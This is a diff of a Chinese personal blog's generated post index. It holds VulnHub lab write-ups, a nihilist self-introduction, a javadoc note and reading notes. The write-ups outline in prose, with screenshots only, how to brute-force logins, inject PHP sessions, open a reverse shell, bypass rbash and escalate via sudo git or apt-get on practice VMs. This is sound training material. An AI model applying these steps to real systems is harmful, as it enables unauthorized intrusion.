+<h1 id="渗透过程及结果"><a href="#渗透过程及结果" class="headerlink" title="渗透过程及结果"></a>渗透过程及结果</h1><p>网络<br><img src="/2023/12/17/old/Ted-1-writeup/1%E7%BD%91%E7%BB%9C.png"><br>查看web页面<br><img src="/2023/12/17/old/Ted-1-writeup/11%E4%B8%BB%E9%A1%B5.png"><br><img src="/2023/12/17/old/Ted-1-writeup/12%E8%AE%A4%E8%AF%81%E9%A1%B5%E9%9D%A2.png"><br>制作字典并爆破<br><img src="/2023/12/17/old/Ted-1-writeup/13%E5%AD%97%E5%85%B8.png"><br><img src="/2023/12/17/old/Ted-1-writeup/14.png"><br><img src="/2023/12/17/old/Ted-1-writeup/15.png"><br><img src="/2023/12/17/old/Ted-1-writeup/16%E6%88%90%E5%8A%9F.png"><br>撕开口子拿shell<br><img src="/2023/12/17/old/Ted-1-writeup/17session%E6%B3%A8%E5%85%A5.png"><br><img src="/2023/12/17/old/Ted-1-writeup/18fantanshell%E8%AF%AD%E5%8F%A5.png"><br><img src="/2023/12/17/old/Ted-1-writeup/19%E6%8B%BF%E5%88%B0shell.png"><br>提权<br><img src="/2023/12/17/old/Ted-1-writeup/20%E6%8F%90%E6%9D%83.png"></p>
+<h1 id="总结反思"><a href="#总结反思" class="headerlink" title="总结反思"></a>总结反思</h1><ol>
+<li>靶机真短</li>
+<li>不过session注入是一个非常好的思路</li>
+<li>user_pref什么的，还有sudo-l只执行apt-get太刻意了</li>
+</ol>
+<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote>
+<p>学校资料<br><a href="https://ab-alex.github.io/2019/06/11/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">https://ab-alex.github.io/2019/06/11/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</a> session路径参考<br><a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a> 提权方式参考</p>
+</blockquote>
 ]]></content>
       <categories>
         <category>网络安全</category>
-        <category>社会工程学</category>
       </categories>
       <tags>
-        <tag>笔记</tag>
+        <tag>writeup</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>bob_writeup</title>
+    <url>/2023/12/11/old/bob_writeup/</url>
+    <content><![CDATA[<h1 id="靶机简介"><a href="#靶机简介" class="headerlink" title="靶机简介"></a>靶机简介</h1><blockquote>
+<p>名称: Bob: 1.0.1<br>作者：<a href="https://www.vulnhub.com/author/c0rruptedb1t,578/">c0rruptedb1t</a><br>靶机链接1:<a href="https://www.vulnhub.com/entry/bob-101,226/">https://www.vulnhub.com/entry/bob-101,226/</a><br>靶机链接2:<a href="http://c0rruptedb1t.com/vms/bob.html">http://c0rruptedb1t.com/vms/bob.html</a><br>Your Goal is to get the flag in &#x2F;</p>
+</blockquote>
+<p>Hints: Remember to look for hidden info&#x2F;files </p>
+<span id="more"></span>
+
+<h1 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h1><h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><ol>
+<li>robots.txt泄露靶机的自带命令执行webshell</li>
+</ol>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><ol>
+<li>找到bob家目录下的敏感文件 和 其Document目录下的一堆敏感文件</li>
+<li>根据文件信息得到jc用户的登录口令和一个加密文件及其密码(密码放在藏头诗里面)</li>
+<li>根据加密文件得到bob用户的登录口令</li>
+<li>bob用户被委派了所有的sudo权限，固能直接切换为root，也能直接查看flag</li>
+</ol>
+<h1 id="工具和技术"><a href="#工具和技术" class="headerlink" title="工具和技术"></a>工具和技术</h1><ul>
+<li>GnuPG 最流行的数据加密,数字签名工具软件</li>
+<li>GPG加密的具体步骤</li>
+</ul>
+<ol>
+<li>创建密钥(公钥,私钥)</li>
+<li>公钥用来加密数据,共享给其他人,通过导出公钥实现</li>
+<li>其他人导入公钥,并加密信息发给私钥拥有者</li>
+<li>私钥解密,查看文档</li>
+</ol>
+<p>其遵循OpenPGP标准，由RFC 4880定义</p>
+<h1 id="渗透过程及结果"><a href="#渗透过程及结果" class="headerlink" title="渗透过程及结果"></a>渗透过程及结果</h1><p>网络情况<br><img src="/2023/12/11/old/bob_writeup/20.png"><br>命令执行漏洞<br><img src="/2023/12/11/old/bob_writeup/45.png"><br>反弹shell<br><img src="/2023/12/11/old/bob_writeup/55.png"><br>在bob家目录发现old_passwordfile<br><img src="/2023/12/11/old/bob_writeup/66.png"><br><img src="/2023/12/11/old/bob_writeup/1.png"><br>登陆jc用户<br><img src="/2023/12/11/old/bob_writeup/2.png"><br>查看bob Secret目录下的内容<br><img src="/2023/12/11/old/bob_writeup/3.png"><br>查看notes.sh内容<br><img src="/2023/12/11/old/bob_writeup/4.png"><br>藏头诗密码解密密文<br><img src="/2023/12/11/old/bob_writeup/5.png"><br>密文内容<br><img src="/2023/12/11/old/bob_writeup/6.png"><br>登陆bob<br><img src="/2023/12/11/old/bob_writeup/7.png"><br>提权，sudo的可用权限大的很<br><img src="/2023/12/11/old/bob_writeup/8.png"><br><img src="/2023/12/11/old/bob_writeup/9.png"></p>
+<h1 id="总结反思"><a href="#总结反思" class="headerlink" title="总结反思"></a>总结反思</h1><ol>
+<li>靶机唯二的难点在于找文件和看藏头诗，都是凭借经验和脑洞灵感之类的东西</li>
+<li>gpg加密这门技术对我来说比较新鲜</li>
+<li>像什么藏头诗、字谜什么的内容可以尝试玩一玩练一练</li>
+</ol>
+<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote>
+<p>学校给的资料<br><a href="https://www.gnupg.org/">https://www.gnupg.org/</a><br><a href="https://www.openpgp.org/">https://www.openpgp.org/</a></p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>网络安全</category>
+      </categories>
+      <tags>
+        <tag>writeup</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>dc-2-writeup</title>
+    <url>/2023/12/24/old/dc-2-writeup/</url>
+    <content><![CDATA[<h1 id="靶机简介"><a href="#靶机简介" class="headerlink" title="靶机简介"></a>靶机简介</h1><blockquote>
+<p>靶机链接： <a href="https://www.vulnhub.com/entry/dc-2,311/">https://www.vulnhub.com/entry/dc-2,311/</a><br>靶机链接： <a href="http://www.five86.com/dc-2.html">http://www.five86.com/dc-2.html</a><br>系列：- <a href="https://www.vulnhub.com/series/dc,199/">DC</a></p>
+</blockquote>
+<p><img src="/2023/12/24/old/dc-2-writeup/-"></p>
+<h1 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h1><h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><ol>
+<li>绑定ip和域名</li>
+<li>通过wpscan获取用户名，并用cewl获取密码，制作成两个字典</li>
+<li>msf爆破，得到两个账户</li>
+<li>通过其中一个账户，得到shell</li>
+</ol>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><ol>
+<li>绕过rbash</li>
+<li>尝试切换另一个账户，成功</li>
+<li>sudo -l发现git的委派权限</li>
+<li>git提权</li>
+</ol>
+<h1 id="工具和技术"><a href="#工具和技术" class="headerlink" title="工具和技术"></a>工具和技术</h1><blockquote>
+<p>cewl通过爬虫生成字典<br>rbash绕过</p>
+</blockquote>
+<h1 id="渗透过程及结果"><a href="#渗透过程及结果" class="headerlink" title="渗透过程及结果"></a>渗透过程及结果</h1><p>查看网络<br><img src="/2023/12/24/old/dc-2-writeup/10%E7%BD%91%E7%BB%9C.png"><br>绑定域名和ip<br><img src="/2023/12/24/old/dc-2-writeup/11.png"><br>第一个flag<br><img src="/2023/12/24/old/dc-2-writeup/12flag1.png"><br>制作网站登录爆破字典，爆出账户密码<br><img src="/2023/12/24/old/dc-2-writeup/13user.png"><br><img src="/2023/12/24/old/dc-2-writeup/14password.png"><br><img src="/2023/12/24/old/dc-2-writeup/15brute.png"><br><img src="/2023/12/24/old/dc-2-writeup/16flag2.png"><br>拿shell<br><img src="/2023/12/24/old/dc-2-writeup/17getshell.png"><br>提权<br><img src="/2023/12/24/old/dc-2-writeup/18%E8%83%BD%E6%89%A7%E8%A1%8C%E7%9A%84%E5%91%BD%E4%BB%A4.png"><br><img src="/2023/12/24/old/dc-2-writeup/19flag4.png"><br><img src="/2023/12/24/old/dc-2-writeup/20%E6%9F%A5%E7%9C%8B%E6%9D%83%E9%99%90.png"><br><img src="/2023/12/24/old/dc-2-writeup/21root.png"><br><img src="/2023/12/24/old/dc-2-writeup/22finalflag.png"></p>
+<h1 id="总结反思"><a href="#总结反思" class="headerlink" title="总结反思"></a>总结反思</h1><p>在打DC-2的时候，在最后的提权阶段，感受到了急躁<br>首先就是，在得到了flag2，得到了两个用户和密码的时候，没有去试ssh，而是先去看了writeup<br>然后就是里面cd命令回显rbash的时候，没有首先去搜rbash，而是去看了一眼writeup<br>最后就是，绕过rbash之后，也没有尝试使用su进行用户切换，而是去看了一眼writeup<br>受不了了</p>
+<ol>
+<li>不要放过任何的回显</li>
+<li>尝试每一个账户，在可登录的任何地方</li>
+<li>每每感受到了障碍，就明晰进入下一步可能可以做什么？需要什么信息？当前有什么信息？可以用信息来干嘛？</li>
+</ol>
+<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote>
+<p><a href="https://gtfobins.github.io/gtfobins/git/#sudo">https://gtfobins.github.io/gtfobins/git/#sudo</a> 提权<br><a href="https://cloud.tencent.com/developer/article/1720937">https://cloud.tencent.com/developer/article/1720937</a> 修改环境变量中的PATH<br><a href="https://www.freebuf.com/articles/system/188989.html">https://www.freebuf.com/articles/system/188989.html</a> rbash绕过</p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>网络安全</category>
+      </categories>
+      <tags>
+        <tag>writeup</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>gigachad:1-writeup</title>
+    <url>/2024/03/09/old/gigachad-1-writeup/</url>
+    <content><![CDATA[<p>靶机地址:<a href="https://www.vulnhub.com/entry/gigachad-1,657/">https://www.vulnhub.com/entry/gigachad-1,657/</a></p>
+<h1 id="要点"><a href="#要点" class="headerlink" title="要点"></a>要点</h1><ol>
+<li>开启的ftp服务是能匿名登录的</li>
+<li>根据ftp里那个的提示，了解了一个username，可以从web上获取一张藏有密码提示的图片</li>
+<li>图片里没有用到隐写，应该去google上搜图</li>
+<li>find可以找到，靶机里有个s-nail-privsec的SUID文件，在exploitdb上找相关的exp就能提权</li>
+</ol>
+<p>文章讲解：<br><a href="https://nepcodex.com/2021/07/gigachad-walkthrough-vulnhub-writeup/">https://nepcodex.com/2021/07/gigachad-walkthrough-vulnhub-writeup/</a><br><a href="https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2017-5899">https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2017-5899</a></p>
+<h1 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h1><p><img src="/2024/03/09/old/gigachad-1-writeup/drippinchad.png"><br><img src="/2024/03/09/old/gigachad-1-writeup/flag.png"><br><img src="/2024/03/09/old/gigachad-1-writeup/chad_real_identity.png"></p>
+<h1 id="有趣的东西"><a href="#有趣的东西" class="headerlink" title="有趣的东西"></a>有趣的东西</h1><h2 id="the-real-gigachad"><a href="#the-real-gigachad" class="headerlink" title="the real gigachad"></a>the real gigachad</h2><p>关于靶机根目录里留下的图片，可以获取一下信息：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">演员的维基介绍 https://tr.wikipedia.org/wiki/Sefa_Zengin</span><br><span class="line"></span><br><span class="line">2003-2004 - Kurtlar Vadisi - Erdal Kömürcü</span><br><span class="line"></span><br><span class="line">土耳其惡狼谷 英文名:Valley of the Wolves 土耳其名:Kurtlar Vadisi</span><br><span class="line">Erdal Kömürcü是该系列的一名角色</span><br></pre></td></tr></table></figure>
+<p>大多数是土耳其语，并且目前的翻译软件比较垃圾，又懒得看，就只能给出这点东西了</p>
+<h2 id="rabbit-hole"><a href="#rabbit-hole" class="headerlink" title="rabbit hole"></a>rabbit hole</h2><p>dirsearch 扫描web的时候会冒出来一堆莫名其妙的东西，我也不知道这个叫什么，在 <a href="https://nepcodex.com/2021/07/gigachad-walkthrough-vulnhub-writeup/">https://nepcodex.com/2021/07/gigachad-walkthrough-vulnhub-writeup/</a> 里被叫做兔子洞，但我直接搜会搜到别的东西</p>
+<p><a href="https://rabbithole.gg/">https://rabbithole.gg/</a><br>web3，学不会一点（−＿−；）</p>
+]]></content>
+      <categories>
+        <category>网络安全</category>
+      </categories>
+      <tags>
+        <tag>writeup</tag>
       </tags>
   </entry>
   <entry>
@@ -1089,6 +469,99 @@
       </categories>
       <tags>
         <tag>writeup</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>hello_and_call_me_lord</title>
+    <url>/2023/10/21/old/hello-and-call-me-lord/</url>
+    <content><![CDATA[<h1 id="你好👋"><a href="#你好👋" class="headerlink" title="你好👋"></a>你好👋</h1><p><img src="/2023/10/21/old/hello-and-call-me-lord/%E8%BF%9C%E8%A7%86%E4%B8%BB%E4%B9%89%E6%97%97%E5%B8%9C.jpeg"></p>
+<h2 id="关于我的名字和这个教会"><a href="#关于我的名字和这个教会" class="headerlink" title="关于我的名字和这个教会"></a>关于我的名字和这个教会</h2><p>我是truthleader，也可以叫我真理教教主</p>
+<span id="more"></span>
+
+<p>我本来给自己设计的网名就是真理教教主，但是truthleader听上去更朗朗上口</p>
+<p>所以我用google翻译得到了truthleader，（很遗憾现在不是这样的翻法了）😭</p>
+<p>这是一个教会的官方网站，但是注意，这是一个私人的教会，我的意识是教会成员只有一个人，我兼任教主、圣战委员会常务委员长、自我教育局局长······</p>
+<p>总之，这个网站代表着我想要公之于众的自我内心世界，我的初心就是把我最真实的精神世界裸露出来，不论祂是否让人感到愉悦好玩、恶心厌恶————I don’t care a fuck</p>
+<h2 id="关于我"><a href="#关于我" class="headerlink" title="关于我"></a>关于我</h2><p>我学习的专业是信息安全，我将此看作我主要的经济来源，这是我的爱好</p>
+<p>我喜欢学习：哲学的、社会学的、科学的、政治的、心理的、生物的、医学的、地理的、计算机或者安全相关的——一切都是我想学的</p>
+<p>我希望别人对我的评价是：thinker</p>
+<h3 id="我的观念"><a href="#我的观念" class="headerlink" title="我的观念"></a>我的观念</h3><p>我将虚无主义预设为前提：</p>
+<ol>
+<li>目的本身是没目的的</li>
+<li>意义本身是没意义的</li>
+<li>存在是虚无的，但其存在是一个奇迹</li>
+<li>伦理道德是空虚之物</li>
+<li>不能用虚无为自己消极的态度做辩护，两者根本不接轨，想自杀的人因此而无顾忌，乐观向上的人因此而无拘束的乐于助人追求进步</li>
+<li>自杀是不对的，死亡是不对的，人的欲望不应把人摧毁，我的欲望不应把我摧毁，</li>
+</ol>
+<ul>
+<li><p>所谓的“我”是头脑生出的幻想，我所认为的那个“我”并不存在，本真的“我”是虚无的，所谓的自我意识是欲望集合体的某一个组织——调配欲望的优先满足顺序、计划欲望满足的机器</p>
+</li>
+<li><p>我把“求知欲”认定为我，我将禁欲的欲望当作枪来压制游戏的欲望和性的欲望，一切互相制衡分出高低，我把自己看作一个欲望代言人，欲望都想当我</p>
+</li>
+<li><p>求知欲是唯一变革自我观念、自我能力、自我的动力，我因此而行动生活，我不认为我的观念是真的、有价值的、可信的</p>
+</li>
+<li><p>我因为学习和头脑训练得出观念，我视其为求知欲想认识自己</p>
+</li>
+<li><p>我将欲望看作是第一性的，因而以此为基础来看待世界</p>
+</li>
+<li><p>对我来说，欲望的对象是具体的人和事，但欲望的目的是自我再生产，欲望通过快感实现再生产</p>
+</li>
+<li><p>快感是让人有愧疚感、罪恶感、兴奋感的上瘾之物</p>
+</li>
+<li><p>欲望的停止就是世界的死去</p>
+</li>
+<li><p>一切都是欲望的产物，包括欲望，例如：时间在前进、世界在涌现、现在带着过去奔向未来、有着“定律”的未来在把现实和过去牵引、资本为了再生产而支取肉身、变革者为了福祉、平等、幸福、理想而不断的前进、福祉本身的标准越来越高、科学越来越复杂强大、抖音越刷越想刷、游戏越玩越想玩</p>
+</li>
+<li><p>人不应该在欲望上让步，要不顾一切的让自己的欲望不断的再生产——保持生存、避免危险、享用美食、求取知识、爱另一半、尊老爱幼、尊敬师长、服从规矩</p>
+</li>
+<li><p>但欲望之间是互相冲突的，例如：想吃饭同时又想五谷轮回，总要先五谷轮回才能吃好饭，你是否想在五谷轮回的时候吃饭呢？有了一门赚钱的方式，但这触碰了良心，只有先检查良心去伪存真，然后才知道到底要不要这么做？</p>
+</li>
+<li><p>我只捍卫自己的欲望，别人怎么样与我无关，除非有欲望的牵扯，除非长远来看我真的确实就应该服软</p>
+</li>
+<li><p>罪犯有犯罪的能力，共同体的代表有抓捕的权利和义务</p>
+</li>
+</ul>
+<h1 id="关于这个网站和未来的展望"><a href="#关于这个网站和未来的展望" class="headerlink" title="关于这个网站和未来的展望"></a>关于这个网站和未来的展望</h1><h2 id="我必须承认，我什么都没准备好："><a href="#我必须承认，我什么都没准备好：" class="headerlink" title="我必须承认，我什么都没准备好："></a>我必须承认，我什么都没准备好：</h2><ol>
+<li>我没有关于这个网站的一个准确的定位，我不知道这个博客到底有什么价值——能让我使用时间去构筑和维护</li>
+<li>我没有设计这个网站的标签系统和分类系统，我想在博文的数量多一点之后再分类和贴标签</li>
+<li>我认为这个网站的美术和外观都是一坨💩，这个网站堪堪一用就被我上传上来了（说不定以后会改善，我可能会钻研css和js，我也可能会在github上找我喜欢的代码用到这里来）</li>
+</ol>
+<h2 id="同时我也要对自己争辩，这个网站还是很不错的："><a href="#同时我也要对自己争辩，这个网站还是很不错的：" class="headerlink" title="同时我也要对自己争辩，这个网站还是很不错的："></a>同时我也要对自己争辩，这个网站还是很不错的：</h2><ol>
+<li>我能通过这个来展示自己的能力，以后甚至可以写简介里</li>
+<li>我可以通过这个网站来吸引一些同好来交流，我将因此而得到提升</li>
+<li>我将通过对这个网站灌注心血来反向提升自我</li>
+</ol>
+<h2 id="然后，你可能会好奇，我会写些什么："><a href="#然后，你可能会好奇，我会写些什么：" class="headerlink" title="然后，你可能会好奇，我会写些什么："></a>然后，你可能会好奇，我会写些什么：</h2><ol>
+<li>CTF题目的writeup</li>
+<li>靶机的writeup</li>
+<li>漏洞的技术文档或学习笔记</li>
+<li>对安全事件的技术性反思</li>
+<li>对我的观念的阐述</li>
+<li>网安甚至其他内容的学习笔记</li>
+<li>读书笔记</li>
+</ol>
+<h2 id="我希望这个网站："><a href="#我希望这个网站：" class="headerlink" title="我希望这个网站："></a>我希望这个网站：</h2><ol>
+<li>能越来越有名气</li>
+<li>外观和美术越来越好看</li>
+<li>每个人能从中获益，从而找到好友</li>
+<li>能给我的就业和真实生活带了进步</li>
+<li>有一个完善的标签和分类体系</li>
+</ol>
+]]></content>
+  </entry>
+  <entry>
+    <title>javadoc</title>
+    <url>/2024/01/30/old/javadoc/</url>
+    <content><![CDATA[<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 文档注释</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>
+
+<p>运行命令，生成文档注释对应的技术文档</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">javadoc 文件名 -d 指定目录</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>java</category>
+      </categories>
+      <tags>
+        <tag>笔记</tag>
       </tags>
   </entry>
   <entry>
@@ -1223,82 +696,609 @@
       </tags>
   </entry>
   <entry>
-    <title>hello_and_call_me_lord</title>
-    <url>/2023/10/21/old/hello-and-call-me-lord/</url>
-    <content><![CDATA[<h1 id="你好👋"><a href="#你好👋" class="headerlink" title="你好👋"></a>你好👋</h1><p><img src="/2023/10/21/old/hello-and-call-me-lord/%E8%BF%9C%E8%A7%86%E4%B8%BB%E4%B9%89%E6%97%97%E5%B8%9C.jpeg"></p>
-<h2 id="关于我的名字和这个教会"><a href="#关于我的名字和这个教会" class="headerlink" title="关于我的名字和这个教会"></a>关于我的名字和这个教会</h2><p>我是truthleader，也可以叫我真理教教主</p>
+    <title>读书笔记《潜规则——中国历史中的真实游戏》</title>
+    <url>/2023/11/23/old/readingnote001/</url>
+    <content><![CDATA[<p>在整理笔记库的时候发现的，尽管内容浅薄，但是存着吃灰也可惜，就发了</p>
 <span id="more"></span>
 
-<p>我本来给自己设计的网名就是真理教教主，但是truthleader听上去更朗朗上口</p>
-<p>所以我用google翻译得到了truthleader，（很遗憾现在不是这样的翻法了）😭</p>
-<p>这是一个教会的官方网站，但是注意，这是一个私人的教会，我的意识是教会成员只有一个人，我兼任教主、圣战委员会常务委员长、自我教育局局长······</p>
-<p>总之，这个网站代表着我想要公之于众的自我内心世界，我的初心就是把我最真实的精神世界裸露出来，不论祂是否让人感到愉悦好玩、恶心厌恶————I don’t care a fuck</p>
-<h2 id="关于我"><a href="#关于我" class="headerlink" title="关于我"></a>关于我</h2><p>我学习的专业是信息安全，我将此看作我主要的经济来源，这是我的爱好</p>
-<p>我喜欢学习：哲学的、社会学的、科学的、政治的、心理的、生物的、医学的、地理的、计算机或者安全相关的——一切都是我想学的</p>
-<p>我希望别人对我的评价是：thinker</p>
-<h3 id="我的观念"><a href="#我的观念" class="headerlink" title="我的观念"></a>我的观念</h3><p>我将虚无主义预设为前提：</p>
-<ol>
-<li>目的本身是没目的的</li>
-<li>意义本身是没意义的</li>
-<li>存在是虚无的，但其存在是一个奇迹</li>
-<li>伦理道德是空虚之物</li>
-<li>不能用虚无为自己消极的态度做辩护，两者根本不接轨，想自杀的人因此而无顾忌，乐观向上的人因此而无拘束的乐于助人追求进步</li>
-<li>自杀是不对的，死亡是不对的，人的欲望不应把人摧毁，我的欲望不应把我摧毁，</li>
+<h1 id="纲要线索"><a href="#纲要线索" class="headerlink" title="纲要线索"></a>纲要线索</h1><ol>
+<li>合法伤害权——因而杀心自起，以此讹人夺利</li>
+<li>民不和官斗<ol>
+<li>民斗官，对于民成本竟大于收益，对于官却牵扯到万万人的孝敬。斗争意志比不上</li>
+<li>官手段多，民的手段少(钱、知识、关系网、组织)</li>
+<li>民是散沙，需要出头鸟，但出头就要被打，因为太出头就被皇上听见了</li>
 </ol>
+</li>
+<li>公平等级<ol>
+<li>第一级——真实公平</li>
+<li>第二级——民的心里预期</li>
+<li>第三级——不公平</li>
+</ol>
+</li>
+<li>清官淘汰<ol>
+<li>恶政不需要清官</li>
+<li>不做清官的成本低，收益高</li>
+<li>互相勾结效率更高，清官被恶棍排挤</li>
+</ol>
+</li>
+<li>皇帝龙虾<ol>
+<li>信息茧房</li>
+</ol>
+</li>
+<li>潜规则<ol>
+<li>基于主体造福&#x2F;伤害能力形成的，与光明规则偏离冲突的规则，这是私下里的魔鬼契约</li>
+<li>违规者遭受报复</li>
+<li>主要内容是利益再分配，但在基础部分是收割</li>
+<li>新官堕落定律——<ol>
+<li>晏氏转型——离皇帝越远，贪的成本越低，不贪的风险越高，皇帝越容易被蛊惑</li>
+</ol>
+</li>
+<li>正义边界漂移</li>
+<li>帝国死弯<ol>
+<li>征税越多、聚集起来的暴力越多，但产生的叛乱越多，聚集起来的暴力抵不过叛乱自发生产的暴力，帝国就死了</li>
+<li>谷底有硬石，是叛乱的领袖力量</li>
+</ol>
+</li>
+</ol>
+</li>
+</ol>
+<h1 id="振聋发聩"><a href="#振聋发聩" class="headerlink" title="振聋发聩"></a>振聋发聩</h1><blockquote>
+<p>身怀利器，杀心自起<br>百姓如果变成刺猬，我们不久变成清官了吗<br>恶政是一面筛子，淘汰清官，选择恶棍<br>第一次教育教了官员们满口仁义道德，第二次教育教了他们一肚子男娼女盗</p>
+</blockquote>
+<h1 id="总结感想"><a href="#总结感想" class="headerlink" title="总结感想"></a>总结感想</h1><p>潜规则和合法伤害权<br>关系</p>
 <ul>
-<li><p>所谓的“我”是头脑生出的幻想，我所认为的那个“我”并不存在，本真的“我”是虚无的，所谓的自我意识是欲望集合体的某一个组织——调配欲望的优先满足顺序、计划欲望满足的机器</p>
-</li>
-<li><p>我把“求知欲”认定为我，我将禁欲的欲望当作枪来压制游戏的欲望和性的欲望，一切互相制衡分出高低，我把自己看作一个欲望代言人，欲望都想当我</p>
-</li>
-<li><p>求知欲是唯一变革自我观念、自我能力、自我的动力，我因此而行动生活，我不认为我的观念是真的、有价值的、可信的</p>
-</li>
-<li><p>我因为学习和头脑训练得出观念，我视其为求知欲想认识自己</p>
-</li>
-<li><p>我将欲望看作是第一性的，因而以此为基础来看待世界</p>
-</li>
-<li><p>对我来说，欲望的对象是具体的人和事，但欲望的目的是自我再生产，欲望通过快感实现再生产</p>
-</li>
-<li><p>快感是让人有愧疚感、罪恶感、兴奋感的上瘾之物</p>
-</li>
-<li><p>欲望的停止就是世界的死去</p>
-</li>
-<li><p>一切都是欲望的产物，包括欲望，例如：时间在前进、世界在涌现、现在带着过去奔向未来、有着“定律”的未来在把现实和过去牵引、资本为了再生产而支取肉身、变革者为了福祉、平等、幸福、理想而不断的前进、福祉本身的标准越来越高、科学越来越复杂强大、抖音越刷越想刷、游戏越玩越想玩</p>
-</li>
-<li><p>人不应该在欲望上让步，要不顾一切的让自己的欲望不断的再生产——保持生存、避免危险、享用美食、求取知识、爱另一半、尊老爱幼、尊敬师长、服从规矩</p>
-</li>
-<li><p>但欲望之间是互相冲突的，例如：想吃饭同时又想五谷轮回，总要先五谷轮回才能吃好饭，你是否想在五谷轮回的时候吃饭呢？有了一门赚钱的方式，但这触碰了良心，只有先检查良心去伪存真，然后才知道到底要不要这么做？</p>
-</li>
-<li><p>我只捍卫自己的欲望，别人怎么样与我无关，除非有欲望的牵扯，除非长远来看我真的确实就应该服软</p>
-</li>
-<li><p>罪犯有犯罪的能力，共同体的代表有抓捕的权利和义务</p>
-</li>
+<li>皇帝与官</li>
+<li>官与民</li>
+<li>皇帝与民</li>
 </ul>
-<h1 id="关于这个网站和未来的展望"><a href="#关于这个网站和未来的展望" class="headerlink" title="关于这个网站和未来的展望"></a>关于这个网站和未来的展望</h1><h2 id="我必须承认，我什么都没准备好："><a href="#我必须承认，我什么都没准备好：" class="headerlink" title="我必须承认，我什么都没准备好："></a>我必须承认，我什么都没准备好：</h2><ol>
-<li>我没有关于这个网站的一个准确的定位，我不知道这个博客到底有什么价值——能让我使用时间去构筑和维护</li>
-<li>我没有设计这个网站的标签系统和分类系统，我想在博文的数量多一点之后再分类和贴标签</li>
-<li>我认为这个网站的美术和外观都是一坨💩，这个网站堪堪一用就被我上传上来了（说不定以后会改善，我可能会钻研css和js，我也可能会在github上找我喜欢的代码用到这里来）</li>
+]]></content>
+      <categories>
+        <category>读书笔记</category>
+      </categories>
+      <tags>
+        <tag>笔记</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>读书笔记《血酬定律——中国历史中的生存游戏》</title>
+    <url>/2023/11/23/old/readingnote002/</url>
+    <content><![CDATA[<p>在整理笔记库的时候发现的，尽管内容浅薄，但是存着吃灰也可惜，就发了</p>
+<span id="more"></span>
+
+<h1 id="纲要线索"><a href="#纲要线索" class="headerlink" title="纲要线索"></a>纲要线索</h1><ol>
+<li>血酬<ol>
+<li>对暴力的酬劳</li>
+<li>价值取决于争拼对象</li>
+<li>为了什么，可以冒多大的风险</li>
+<li>最大化追求假设</li>
 </ol>
-<h2 id="同时我也要对自己争辩，这个网站还是很不错的："><a href="#同时我也要对自己争辩，这个网站还是很不错的：" class="headerlink" title="同时我也要对自己争辩，这个网站还是很不错的："></a>同时我也要对自己争辩，这个网站还是很不错的：</h2><ol>
-<li>我能通过这个来展示自己的能力，以后甚至可以写简介里</li>
-<li>我可以通过这个网站来吸引一些同好来交流，我将因此而得到提升</li>
-<li>我将通过对这个网站灌注心血来反向提升自我</li>
+</li>
+<li>血酬推想<ol>
+<li>为了追求血酬的长期最大化，土匪愿意建立保护掠夺对象的秩序。</li>
+<li>法酬——法酬&#x3D;全部税费-公共产品价值</li>
+<li>为了追求短期血酬收入的最大化，合法的暴力集团也可以退化为土匪</li>
+<li>随着血酬逐步降低，生产行为的报酬相对提高，土匪可以转化为农民</li>
+<li>假定血酬不变，随着生产收益的减少以至消失，大量生产者将转入暴力集团</li>
+<li>当某种秩序带来的收益超过旧秩序时，立法者和执法者也应该愿意变法，提高或降低对掠夺对象的保护程度</li>
 </ol>
-<h2 id="然后，你可能会好奇，我会写些什么："><a href="#然后，你可能会好奇，我会写些什么：" class="headerlink" title="然后，你可能会好奇，我会写些什么："></a>然后，你可能会好奇，我会写些什么：</h2><ol>
-<li>CTF题目的writeup</li>
-<li>靶机的writeup</li>
-<li>漏洞的技术文档或学习笔记</li>
-<li>对安全事件的技术性反思</li>
-<li>对我的观念的阐述</li>
-<li>网安甚至其他内容的学习笔记</li>
-<li>读书笔记</li>
+</li>
+<li>命价<ol>
+<li>官价</li>
+<li>血价</li>
 </ol>
-<h2 id="我希望这个网站："><a href="#我希望这个网站：" class="headerlink" title="我希望这个网站："></a>我希望这个网站：</h2><ol>
-<li>能越来越有名气</li>
-<li>外观和美术越来越好看</li>
-<li>每个人能从中获益，从而找到好友</li>
-<li>能给我的就业和真实生活带了进步</li>
-<li>有一个完善的标签和分类体系</li>
+</li>
+<li>官话和非官话的转换</li>
+<li>抽水机<ol>
+<li>等水</li>
+<li>抽水</li>
+<li>水来自于暴力差距</li>
+</ol>
+</li>
+<li>灰帮<ol>
+<li>口大口小，形势比人强</li>
+</ol>
+</li>
+<li>灰牢</li>
+<li>英雄到替罪羊的转变</li>
+<li>硬伙企业<ol>
+<li>合作人都是请来的老虎</li>
+</ol>
